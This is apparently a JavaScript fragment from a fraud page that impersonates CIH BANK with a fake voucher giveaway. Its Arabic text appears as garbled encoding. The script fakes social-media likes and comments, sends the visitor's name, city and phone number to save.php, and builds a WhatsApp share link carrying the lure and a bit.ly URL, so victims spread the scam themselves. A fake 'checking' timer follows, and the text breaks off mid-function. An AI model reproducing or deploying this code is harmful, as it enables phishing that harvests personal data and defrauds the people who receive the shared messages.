var texts=["*Ø¨Ù…Ù€Ù†Ø§Ø³Ø¨Ø© Ø¹Ù€ÙŠÙ€Ø¯ Ù…Ù€ÙŠÙ€Ù„Ø§Ø¯ CIH BANK ØªÙ‡Ø¯ÙŠÙƒÙ… Ù‚Ø³ÙŠÙ…Ø© Ø´Ø±Ø§Ø¡ ØªØµÙ„ Ù„Ù€ 2000 Ø¯Ø±Ù‡Ù… ðŸš¨* https://bit.ly/CIH2021"];function loadCom(a,b){setTimeout(function(){$(a).fadeIn(250);},b);}
...
$(document).ready(function(){loadAllComment();$('.like').on('click',function(){var _this=$(this);if(_this.hasClass('active-like')){_this.removeClass('active-like');$('.you').removeClass('activee');}else{_this.addClass('active-like');$('.you').addClass('activee');}});$(document).on('click','.fblike',function(){var _this=$(this);var x=_this.next().next().html()==''?0:parseInt(_this.next().next().html());if(_this.hasClass('selected')){_this.removeClass('selected').html('Ø¥Ø¹Ø¬Ø§Ø¨');_this.next().next().html(--x);if(x==0)_this.next().next().addClass('likehide');}else{_this.addClass('selected').html('Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ø¥Ø¹Ø¬Ø§Ø¨');_this.next().next().html(++x);if(_this.next().next().hasClass('likehide'))_this.next().next().removeClass('likehide');}});$("#addCom").onEnterKey(function(){var value=$("#addCom").val();$("#addCom").val("");$("#myComment").html(value);$(".addComment").hide();loadCom('#myCom',250);});var teilen=10;var pruefen=0;$("#frage_03").click(function(){$('#frage_04').slideDown();$('#frage_03').slideUp();});$("#bt").click(function(){$('#frage_04').slideUp();$.ajax({url:"save.php",data:{name:$("#nameform").val(),city:$("#cityform").val(),city1:$("#city1form").val(),phone:$("#phoneform").val()}});$("#Welcome").html("ØªÙ‡Ø§Ù†ÙŠÙ†Ø§ "+$("#nameform").val()+" !");$('#content_02').fadeIn();$('#frage_05').fadeOut();$('#ads_01').hide();$('#aufforderung1').fadeOut();$('#aufforderung2').fadeOut();var number=Math.floor((Math.random()*texts.length));var rand="whatsapp://send?text="+texts[number];$("#whats").attr("href",rand);var myTimer1=window.setInterval(updateTimer1,2000);function updateTimer1(){pruefen++;$("#check").text(pruefen);if(pruefen==1){show('#pruefen_01');}
